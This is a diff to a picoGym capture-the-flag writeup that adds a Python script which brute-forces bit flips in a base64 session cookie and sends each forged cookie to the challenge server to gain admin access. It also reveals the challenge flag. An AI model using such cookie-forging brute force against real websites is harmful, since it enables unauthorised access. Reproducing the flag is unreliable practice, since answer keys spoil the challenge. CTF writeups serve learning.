@@ -2,7 +2,7 @@
 In this section I will store some writeups for the challenges I managed to solve in the picoGym, except the trivial ones.
 
 Authors: 
-* [Gregorio Galletti](https://github.com/gregalletti) - _griggoswaggo_ (picoGym Score: **7800**)
+* [Gregorio Galletti](https://github.com/gregalletti) - _griggoswaggo_ (picoGym Score: **8030**)
 
 # General Skills
 ## X
@@ -81,9 +81,34 @@ I already faced this type of challenges, so somehow we need to modify the cipher
 
 By doing that, we will make the website decrypt the cookie and consider us as admin. We don't know the position of the bit to change so we need to bruteforce it and send the request to the website that will show us the flag. This is the script I used:
 ```python
+from base64 import b64decode
+from base64 import b64encode
+import requests
+
+cookie = "cHhjTUd0S1VpUmFROG1Cell5d3VkWlI4MWxCNHg2ZnhFOFJMb09pY3NoMmpWVEpYRDR1cStsSkJDb2U3VVV3U3Jlb0NVWHpmUkZieXNZOG9kdmE4MXgxa040SjlhSkRWbGxiaEdVZ08yS0R0VjJVMEdlUElDUXYxUTRGZyt0N2U="
+url = "http://mercury.picoctf.net:21553/"
+
+def flip(index, bit):
+    chars = list(decoded_cookie.decode("utf-8"))
+
+    chars[index] = chr(ord(chars[index])^bit)
+
+    new_cookie = ''.join(chars)
+    return b64encode(new_cookie.encode("utf-8"))
+
+decoded_cookie = b64decode(cookie)
+for i in range(128):
+  print(i)
+  for j in range(128):
+    crafted_cookie = flip(i, j)
+    cookies = {'auth_name':crafted_cookie.decode("utf-8")}
+    r = requests.get(url, cookies=cookies)
+    if "picoCTF{" in r.text:
+      print(r.text)
+      break
 ```
 
-Flag: ****
+Flag: **picoCTF{cO0ki3s_yum_2d20020d}**
 
 # Reverse Engineering
 ## ARMssembly 0 ![p](https://img.shields.io/badge/Points-40-success) ![c](https://img.shields.io/badge/Reverse-lightblue)
